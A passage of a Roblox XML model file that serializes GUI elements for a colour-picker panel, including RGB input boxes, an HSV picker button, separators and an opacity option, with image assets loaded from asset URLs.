													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX8FC11D11887447719A5BAB3BB5D744DD">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX156613B5DDFF497BB7453B9509CEFBF1">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXEE17DE690C3D41B596E94CFCE8A39A58">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXAE20695B37DD4273B6F0222C85A909D8">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXBF520152ABA74A5383EE2A2309F8607B">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXEF1286A7E58C4215A330EAD8BFE4F95C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXB90691CB231E4110B12F3E91889A6E19">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX03F7DDE1EE87402BA032C478C8E8E08E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXC380089408F84A27A9A9C1E513D17ED5">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXB9D5B167B8264070B4E77FA0E7A76745">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBXE4A33F17933F44558B2F2C8BB4A7FB22">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBXCE098E37A1C2441BAEAB2AD40B03E487">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX2B002982C7D84988BD006DC33B4A04CE">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXDD1C3DED9B4046069645C2D64CE71147">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX495D4ADB3F9A4E7082FC921D0D061845">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX558F95CB9739443F9FADD98AFC8C6234">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">OpacityOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX71051AB122794B0D9DB3DE7BDD84CE10">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Opacity</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX98351F7F54EB4524BBB35C91780FBF3F">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXA6A70212AD1549CB95C0C6A679F947B2">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXE55BA80B8DF14A94AE027B1E6FE15A49">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
